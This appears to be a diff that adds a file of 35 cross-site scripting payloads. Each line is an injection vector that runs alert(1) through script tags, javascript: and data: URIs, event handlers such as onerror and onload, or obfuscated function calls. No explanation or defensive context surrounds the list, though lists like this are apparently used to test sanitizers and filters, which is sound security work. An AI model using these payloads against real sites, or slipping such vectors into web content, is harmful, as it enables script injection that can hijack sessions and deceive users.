@@ -1,0 +1,35 @@
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<script src=data:,alert(1)></script>
+<script/x>alert(1)</script>
+<script/src=data:,alert(1)>
+<script defer>alert(1)</script>
+<script async>alert(1)</script>
+<script type="text/javascript">alert(1)</script>
+<script type="module">alert(1)</script>
+<script>alert?.(1)</script>
+<script>window['alert'](1)</script>
+<script>(alert)(1)</script>
+<script>globalThis.alert(1)</script>
+<script>top['al'+'ert'](1)</script>
+<script>{alert(1)}</script>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<applet code="javascript:alert(1)"></applet>
+<base href="javascript:alert(1)//">
+<link rel="import" href="data:text/html,<script>alert(1)</script>">
+<isindex action="javascript:alert(1)" type="image">
+<form action="javascript:alert(1)"><input type=submit></form>
+<button formaction="javascript:alert(1)">click</button>
+<a href="javascript:alert(1)">click</a>
+<frameset onload="alert(1)"></frameset>
+<body onload="alert(1)">
+<body onpageshow="alert(1)">
+<body onresize="alert(1)">
+<marquee onstart="alert(1)">test</marquee>
+<video src=1 onerror="alert(1)">
+<audio src=1 onerror="alert(1)">
+<source src=1 onerror="alert(1)">
+<table background="javascript:alert(1)">
